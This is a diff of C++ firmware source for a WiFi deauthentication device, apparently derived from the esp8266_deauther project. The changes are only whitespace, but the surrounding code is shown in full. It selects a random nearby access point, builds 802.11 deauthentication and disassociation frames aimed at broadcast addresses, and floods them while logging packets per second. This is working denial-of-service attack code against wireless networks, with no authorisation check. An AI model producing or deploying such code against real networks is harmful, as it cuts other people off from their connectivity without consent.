@@ -19,9 +19,9 @@ String Deauth::randomAP = "";
 int Deauth::randomIndex;
 
 /** developer note:
- * 
+ *
  * instead of using the deauth frame normally, we append information to the deauth frame and dynamically write info to the frame
- * 
+ *
 */
 
 uint8_t Deauth::deauthTemp[26] = {
@@ -76,7 +76,7 @@ bool Deauth::send(uint8_t* buf, uint16_t len, bool sys_seq) {
 // source: https://github.com/SpacehuhnTech/esp8266_deauther/blob/v2/esp8266_deauther/functions.h#L334
 bool Deauth::broadcast(uint8_t* mac) {
     for (uint8_t i = 0; i < 6; i++) {
-         if (mac[i] != broadcastAddr[i]) return false;
+        if (mac[i] != broadcastAddr[i]) return false;
     }
 
     return true;
@@ -171,7 +171,7 @@ bool Deauth::select() {
         Display::cleanDisplayFace("('-')");
         Display::attachSmallText("Selected random AP: " + (String) randomAP.c_str());
         delay(250);
-        
+
         if (encType == -1 || encType == ENC_TYPE_NONE) {
             Serial.println("('-') Selected AP is not encrypted. Skipping deauthentication...");
             Display::cleanDisplayFace("('-')");
@@ -190,10 +190,10 @@ bool Deauth::select() {
         }
 
         /** developer note:
-         * 
-         * here we will create the deauth frame using the header, 
+         *
+         * here we will create the deauth frame using the header,
          * as we find the AP in question we also generate the required information for it as well...
-         * 
+         *
         */
 
         // clear out exisitng frame...
@@ -222,11 +222,11 @@ bool Deauth::select() {
         WiFi.macAddress(mac);
 
         /** developer note:
-         * 
+         *
          * addr1: reciever addr
          * addr2: sender addr
          * addr3: filtering addr
-         * 
+         *
         */
 
         // copy our mac(s) to header
@@ -247,12 +247,12 @@ bool Deauth::select() {
 
             // reason
             Deauth::deauthFrame[24] = 0x01; // reason: unspecified
-    
+
             std::copy(apBssid, apBssid + sizeof(apBssid), Deauth::deauthFrame + 4);
             std::copy(Deauth::broadcastAddr, Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr), Deauth::deauthFrame + 10);
             std::copy(Deauth::broadcastAddr, Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr), Deauth::deauthFrame + 16);
 
-            // build disassocaition 
+            // build disassocaition
             Deauth::disassociateFrame[0] = 0xA0; // type
             Deauth::disassociateFrame[1] = 0x00; // subtype
             Deauth::disassociateFrame[2] = 0x00; // duration (SDK takes care of that)
@@ -266,12 +266,12 @@ bool Deauth::select() {
         Serial.print("('-') Full AP SSID: ");
         Serial.println(WiFi.SSID(Deauth::randomIndex));
         Display::cleanDisplayFace("('-')");
-        Display::attachSmallText("Full AP SSID: " + (String) WiFi.SSID(Deauth::randomIndex));  
+        Display::attachSmallText("Full AP SSID: " + (String) WiFi.SSID(Deauth::randomIndex));
 
         Serial.print("('-') AP Encryption: ");
         Serial.println(WiFi.encryptionType(Deauth::randomIndex));
         Display::cleanDisplayFace("('-')");
-        Display::attachSmallText("AP Encryption: " + (String) WiFi.encryptionType(Deauth::randomIndex));  
+        Display::attachSmallText("AP Encryption: " + (String) WiFi.encryptionType(Deauth::randomIndex));
 
         Serial.print("('-') AP RSSI: ");
         Serial.println(WiFi.RSSI(Deauth::randomIndex));
@@ -281,7 +281,7 @@ bool Deauth::select() {
         Serial.print("('-') AP BSSID: ");
         printMac(apBssid);
         Display::cleanDisplayFace("('-')");
-        Display::attachSmallText("AP BSSID: " + (String) Deauth::printMacStr(apBssid));    
+        Display::attachSmallText("AP BSSID: " + (String) Deauth::printMacStr(apBssid));
 
         Serial.print("('-') AP Channel: ");
         Serial.println(WiFi.channel(Deauth::randomIndex));
@@ -323,7 +323,7 @@ bool Deauth::select() {
 
 void Deauth::deauth() {
     if (Config::deauth) {
-       // select AP
+        // select AP
         if (Deauth::select()) {
             if (randomAP.length() > 0) {
                 Serial.println("(>-<) Starting deauthentication attack on the selected AP...");
@@ -394,8 +394,8 @@ void Deauth::start() {
                 Serial.print(" pkt/s");
                 Serial.println(" (AP:" + (String) randomAP.c_str() + ")");
                 Display::cleanDisplayFace("(>-<)");
-                Display::attachSmallText("Packets per second: " + (String) pps + " pkt/s" + "(AP:" + (String) randomAP.c_str() + ")"); 
-            } 
+                Display::attachSmallText("Packets per second: " + (String) pps + " pkt/s" + "(AP:" + (String) randomAP.c_str() + ")");
+            }
         } else if (!Deauth::send(deauthFrame, deauthFrameSize, 0) || !Deauth::send(disassociateFrame, disassociateFrameSize, 0)) {
             Serial.println("(X-X) Both packets failed to send!");
             Display::cleanDisplayFace("(X-X)");
